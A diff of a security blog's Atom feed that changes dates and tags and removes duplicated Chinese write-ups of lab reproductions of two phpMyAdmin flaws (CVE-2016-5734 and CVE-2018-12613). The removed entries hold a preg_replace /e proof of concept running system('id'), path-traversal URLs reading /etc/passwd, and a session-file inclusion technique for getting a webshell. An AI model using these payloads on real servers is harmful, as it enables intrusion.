@@ -6,7 +6,7 @@
     
             <link href="https://l1uyun.one/tags/sec/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/tags/sec/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2025-09-27T01:26:08+00:00</updated>
+    <updated>2025-09-29T13:56:34+00:00</updated>
     
     
     
@@ -19,7 +19,7 @@
             <id>https://l1uyun.one/posts/%E5%8A%9E%E4%BA%86%E4%B8%80%E5%9C%BActf%E6%A0%A1%E8%B5%9B/</id>
             
             <published>2024-12-18T20:53:50+08:00</published>
-            <updated>2025-09-22T08:32:09+08:00</updated>
+            <updated>2025-09-29T20:52:46+08:00</updated>
             
             
             <content type="html"><![CDATA[<h1 id="前言">前言</h1>
@@ -163,9 +163,9 @@
                         
                             
                              
-                                <category scheme="https://l1uyun.one/tags/l1uyun/hnu" term="l1uyun/hnu" label="l1uyun/hnu" />
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
                              
-                                <category scheme="https://l1uyun.one/tags/sec/ctf" term="sec/ctf" label="sec/ctf" />
+                                <category scheme="https://l1uyun.one/tags/hnu" term="hnu" label="hnu" />
                             
                         
                     
@@ -206,7 +206,7 @@
             <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/</id>
             
             <published>2024-10-07T21:20:16+08:00</published>
-            <updated>2024-10-09T14:36:06+08:00</updated>
+            <updated>2025-09-29T20:51:19+08:00</updated>
             
             
             <content type="html"><![CDATA[<h1 id="前言">前言</h1>
@@ -802,7 +802,7 @@ linux的两台机器拿到了
                         
                             
                              
-                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
                             
                         
                     
@@ -816,7 +816,7 @@ linux的两台机器拿到了
             <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</id>
             
             <published>2024-09-28T11:10:12+08:00</published>
-            <updated>2024-11-24T18:41:52+08:00</updated>
+            <updated>2025-09-29T20:51:17+08:00</updated>
             
             
             <content type="html"><![CDATA[<h1 id="前言">前言</h1>
@@ -1194,7 +1194,7 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
                         
                             
                              
-                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
                             
                         
                     
@@ -1208,7 +1208,7 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
             <id>https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
             
             <published>2024-09-18T16:59:09+08:00</published>
-            <updated>2024-09-20T14:55:49+08:00</updated>
+            <updated>2025-09-29T20:52:29+08:00</updated>
             
             
             <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
@@ -1393,210 +1393,7 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
                         
                             
                              
-                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
-                            
-                        
-                    
-                
-            
-        </entry>
-    
-        
-        <entry>
-            <title type="html"><![CDATA[phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞]]></title><link href="https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="alternate" type="text/html" />
-            <id>https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
-            
-            <published>2024-09-18T16:59:09+08:00</published>
-            <updated>2024-09-20T14:55:49+08:00</updated>
-            
-            
-            <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。</p>
-<p>在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。
-在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
-<h2 id="影响版本">影响版本</h2>
-<p>// 漏洞涉及的组件,版本</p>
-<p>phpmyadmin
-4.0.x-4.0.10.16
-4.4.x-4.4.15.7
-4.6.x-4.6.3（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</p>
-<p>Php版本： 4.3.0 ~5.4.6
-Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
-<h2 id="利用条件">利用条件</h2>
-<p>// 利用这个漏洞的前置要求,例如进后台啥的</p>
-<p>这个漏洞需要登录，且要能够写入数据。</p>
-<h2 id="前置知识">前置知识</h2>
-<h3 id="preg_replace的e参数">preg_replace的/e参数</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">preg_replace</span> ( <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">pattern</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">replacement</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">subject</span>,[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">limit</span>],[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">count</span>])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$pattern<span style="color:#f92672">:</span> <span style="color:#a6e22e">要搜索的模式，可以是字符串或一个字符串数组。反斜杠定界符尽量不要使用，而是使用</span> <span style="color:#75715e"># 或者 ~
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$replacement<span style="color:#f92672">:</span> <span style="color:#a6e22e">用于替换的字符串或字符串数组。</span>
-</span></span><span style="display:flex;"><span>$subject<span style="color:#f92672">:</span> <span style="color:#a6e22e">要搜索替换的目标字符串或字符串数组。</span>
-</span></span><span style="display:flex;"><span>$limit<span style="color:#f92672">:</span> <span style="color:#a6e22e">可选，对于每个模式用于每个</span> <span style="color:#a6e22e">subject</span> <span style="color:#a6e22e">字符串的最大可替换次数。默认是</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">（无限制）。</span>
-</span></span><span style="display:flex;"><span>$count<span style="color:#f92672">:</span> <span style="color:#a6e22e">可选，为替换执行的次数。</span>
-</span></span></code></pre></div><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。
-提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
-例如,对于下面这个代码,访问h=phpinfo(),就能触发phpinfo页面</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/test/e&#34;</span>,<span style="color:#e6db74">&#39;phpinfo()&#39;</span>,<span style="color:#e6db74">&#34;jutst test&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_1.png" alt="" /></figure>
-
-
-</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>//手测,脚本</p>
-<p>使用的vulhub的环境,使用docker启动就行</p>
-<p>这里是直接使用了exploit-db中的poc
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_2.png" alt="" /></figure>
-
-
-</p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>// 分析原理,调用链</p>
-<p>参照网上其他人的分析文章,
-首先找到preg_replace()函数的调用位置,
-发现是在 /libraries/TableSearch.class.php 文件中的_getRegexReplaceRows方法里面</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_3.png" alt="" /></figure>
-
-
-
-接下来就是依次寻找find,replaceWith和row[0]这三个参数的来源</p>
-<p>可以看到find,replaceWith是直接从getReplacePreview中传递过去的
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_4.png" alt="" /></figure>
-
-
-
-继续往上查找getReplacePreview方法,发现是在tbl_find_replace.php中被调用的,这里的可以看到find,replaceWith都是直接从POST中传递进来的
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_5.png" alt="" /></figure>
-
-
-</p>
-<p>解决了前面两个参数,接下来就是看第三个参数是怎么来的,毕竟这个/e参数要成功执行代码,需要正则的模式被匹配到.</p>
-<p>回到_getRegexReplaceRows方法,可以看到row[0]应该是sql语句查询结果的第一列数据
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_6.png" alt="" /></figure>
-
-
-
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_7.png" alt="" /></figure>
-
-
-
-sql语句的内容如下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> 
-</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>),   <span style="color:#75715e">-- 获取列名并进行反引号处理
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">1</span>,                              <span style="color:#75715e">-- 添加一个额外的列，该列用于存储替换后的值
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">COUNT</span>(<span style="color:#f92672">*</span>)                        <span style="color:#75715e">-- 计算匹配的行数
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">FROM</span> 
-</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span>this<span style="color:#f92672">-&gt;</span>_db)   <span style="color:#75715e">-- 数据库名，反引号处理
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    .PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span>this<span style="color:#f92672">-&gt;</span>_table) <span style="color:#75715e">-- 表名，反引号处理
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">WHERE</span> 
-</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>)       <span style="color:#75715e">-- 目标列
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RLIKE <span style="color:#e6db74">&#39;&#34; . PMA_Util::sqlAddSlashes($find) . &#34;&#39;</span>  <span style="color:#75715e">-- 使用正则匹配 $find，确保字符转义
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#34; . $charSet . &#34;</span>_bin      <span style="color:#75715e">-- 使用二进制排序规则进行区分大小写的比较
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">GROUP</span> <span style="color:#66d9ef">BY</span> 
-</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>)       <span style="color:#75715e">-- 按目标列分组
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> 
-</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>) <span style="color:#66d9ef">ASC</span>   <span style="color:#75715e">-- 按目标列升序排列
-</span></span></span></code></pre></div><p>这里面我们需要能够控制column,_db,_table,其中column是来自columnIndex这个参数,这个也是POST传进来的</p>
-<p>剩下两个参数是PMA_TableSearch类的属性,是在构造函数里面被定义的
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_8.png" alt="" /></figure>
-
-
-
-继续回溯,tbl_find_replace.php中创建了这个类,并传入了$db, $table这两个参数
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_9.png" alt="" /></figure>
-
-
-
-这两个参数是包含的libraries/common.inc.php文件,这两个参数可以通过REQUEST方法来接收变量并将其设置为全局变量。
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_10.png" alt="" /></figure>
-
-
-</p>
-<p>结合上面的分析,看看exploit-db给的poc</p>
-<p>使用poc,然后用burpsuite抓了一下包,脚本先是进行了登录
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_11.png" alt="" /></figure>
-
-
-
-前面两个数据包好像都是在获取一些Cookie信息,第一个是在登录获取token值,第二个包是在访问主页,获取了另外的一些值
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_12.png" alt="" /></figure>
-
-
-
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_13.png" alt="" /></figure>
-
-
-
-第三个包访问了/import.php,这个文件是PhpMyAdmin中处理SQL导入的页面。这个页面允许管理员导入SQL查询语句，并在数据库中执行。</p>
-<p>创建了一个数据库test,数据表prgpwn,以及插入了数据(<code>0/e\0</code>)  即0/e和一个null byte
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_14.png" alt="|900" /><figcaption>|900</figcaption></figure>
-
-
-
-最后一个包,访问了漏洞所在的php文件,/tbl_find_replace.php</p>
-<p>传入了db,table,find,replaceWith这些参数,find和replaceWith直接被拼接到了preg_replace的前面两个参数中,而POST的数据中的db,table,columnIndex指定了sql查询得到的结果,这个结果被拼接到了preg_replace的第三个参数,从而触发了preg_replace的/e参数的执行代码功能.
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_15.png" alt="" /></figure>
-
-
-
-find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">/&#34;</span>,<span style="color:#e6db74">&#34;system(&#39;id&#39;)&#34;</span>,<span style="color:#e6db74">&#34;0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
-<p>// 升级版本,打补丁,黑名单,白名单&hellip;..</p>
-<p>及时更新版本。</p>
-<h2 id="参考资料">参考资料</h2>
-<p><a href="https://www.exploit-db.com/exploits/40185" target="_blank" rel="noopener nofollow noreferrer" >phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution - PHP webapps Exploit</a></p>
-<p><a href="https://www.cnblogs.com/angly/p/3157736.html" target="_blank" rel="noopener nofollow noreferrer" >PHP安全之慎用preg_replace的/e修饰符 - y&rsquo;ang - 博客园</a></p>
-<p><a href="https://xz.aliyun.com/t/7836" target="_blank" rel="noopener nofollow noreferrer" >CVE-2016-5734 phpmyadmin后台代码执行漏洞复现</a></p>
-]]></content>
-            
-                 
-                    
-                 
-                    
-                         
-                        
-                            
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
                             
                         
                     
@@ -1610,7 +1407,7 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
             <id>https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
             
             <published>2024-09-18T15:33:13+08:00</published>
-            <updated>2024-09-19T22:35:37+08:00</updated>
+            <updated>2025-09-29T20:52:25+08:00</updated>
             
             
             <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
@@ -1705,120 +1502,7 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
                         
                             
                              
-                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
-                            
-                        
-                    
-                
-            
-        </entry>
-    
-        
-        <entry>
-            <title type="html"><![CDATA[phpmyadmin-4.8.1远程文件包含]]></title><link href="https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="alternate" type="text/html" />
-            <id>https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
-            
-            <published>2024-09-18T15:33:13+08:00</published>
-            <updated>2024-09-19T22:35:37+08:00</updated>
-            
-            
-            <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
-<p>这个漏洞刚刚打演练的时候用过,分析一下原理</p>
-<h2 id="影响版本">影响版本</h2>
-<p>phpmyadmin 4.8.0 &amp; 4.8.1</p>
-<h2 id="前提条件">前提条件</h2>
-<p>能够进入后台,也就是要有数据库的凭据</p>
-<h2 id="前置知识">前置知识</h2>
-<h3 id="php文件包含">php文件包含</h3>
-<p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。
-文件包含相关函数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>require<span style="color:#f92672">()</span><span style="color:#75715e">#函数出现错误的时候，会直接报错并退出程序的执行</span>
-</span></span><span style="display:flex;"><span>require_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
-</span></span><span style="display:flex;"><span>include<span style="color:#f92672">()</span><span style="color:#75715e">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span>
-</span></span><span style="display:flex;"><span>include_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
-</span></span></code></pre></div><p>文件包含分为本地文件包含和远程文件包含</p>
-<p>远程文件包含利用需要下面这两个配置文件都开启
-当allow_url_include和allow_url_fopen都开启时，可以通过利用远程url或者php://协议直接getshell，即远程文件包含，
-但allow_url_include在php5.2之后默认为off，利用机会有限。
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_1.png" alt="" /></figure>
-
-
-
-当allow_url_include and allow_url_fopen均为off 在window主机环境下仍然可以进行远程文件执行，用445端口SMB协议进行远程加载。</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>直接访问下面的路径,能输出passwd内容那就是有了</p>
-<p><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>
-
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_2.png" alt="" /></figure>
-
-
-</p>
-<p>利用方式的话,就是先在sql栏执行一下select命令,然后去包含session文件,就能获得webshell,进而拿shell</p>
-<p>可以执行一下<code>SELECT &lt;?=phpinfo()?&gt;;</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：</p>
-<p>对应的sessions文件是 /tmp/sess_sessionid
-<a href="phpmyadmin-4_8_1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%ef%bc%88CVE-2018-12613%ef%bc%89.pdf">phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）</a></p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>简单来说就是phpmyadmin对用户传入的参数直接进行了包含,并且黑名单的检验不严格,可以绕过,从而导致了LFI</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// If we have a valid target, let&#39;s load that script instead
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^index/&#39;</span>, $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>], $target_blacklist)
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">Core</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkPageValidity</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
-</span></span><span style="display:flex;"><span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 黑名单
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$target_blacklist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;import.php&#39;</span>, <span style="color:#e6db74">&#39;export.php&#39;</span>
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php?/../../../../../../../../etc/passwd
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Windows环境下利用需要对?进行编码</span>
-</span></span><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
-</span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
-<p>进入后台之后,查看版本信息</p>
-<h2 id="漏洞修复">漏洞修复</h2>
-<p>升级phpmyadmin版本</p>
-<h2 id="相关漏洞">相关漏洞</h2>
-<p><a href="phpMyAdmin-4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e.md">phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞</a></p>
-<h2 id="漏洞总结">漏洞总结</h2>
-<p>这个漏洞刚刚演练的时候利用过,比较熟悉了&hellip;
-记忆这个漏洞</p>
-<ul>
-<li>组件:phpmyadmin</li>
-<li>版本:4.8.1&amp;4.8.0</li>
-<li>漏洞类型:文件包含</li>
-</ul>
-<p>假设你在尝试利用,挖掘这个漏洞</p>
-<ul>
-<li>漏洞产生点:首页的target参数</li>
-<li>漏洞类型:文件包含</li>
-<li>漏洞利用方法:通过对sessions文件进行包含从而实现rce</li>
-<li>遇到问题之后的解决方案:</li>
-</ul>
-]]></content>
-            
-                 
-                    
-                 
-                    
-                         
-                        
-                            
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
-                             
-                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
+                                <category scheme="https://l1uyun.one/tags/sec" term="sec" label="sec" />
                             
                         
                     
@@ -3072,6 +2756,634 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span></code></pre></div><h1 id="links">links</h1>
 <p><a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/" target="_blank" rel="noopener nofollow noreferrer" >Puff-Pastry | Target Machines WriteUp</a></p>
 <p><a href="https://blog.csdn.net/imtech/article/details/139829808" target="_blank" rel="noopener nofollow noreferrer" >FRP内网穿透及多级代理的使用</a></p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
